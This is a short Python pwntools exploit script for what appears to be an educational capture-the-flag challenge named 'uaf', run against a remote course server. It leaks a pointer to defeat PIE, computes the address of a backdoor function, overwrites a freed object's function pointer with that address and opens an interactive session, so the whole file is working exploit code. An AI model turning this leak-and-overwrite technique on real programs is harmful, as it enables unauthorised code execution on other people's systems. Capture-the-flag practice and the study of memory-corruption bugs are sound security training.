#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = remote('edu-ctf.csie.org',10177)
#r = process('./uaf')

r.recvuntil('messege:')
r.sendline('8')

r.recvuntil('Messege:')
r.send('a'*8)

r.recvuntil('messege: ')

# has PIE , so we need to leak binary_base 
binary_base = u64(r.recvuntil('\n')[8:-1].ljust(8,'\x00')) - 0xa77
print hex(binary_base)

# calc backdoor func addr
backdoor = binary_base + 0xab5


r.recvuntil('messege:')
r.sendline('16')

r.recvuntil('Messege:')
r.send('a'*8 + p64(backdoor))

r.interactive()
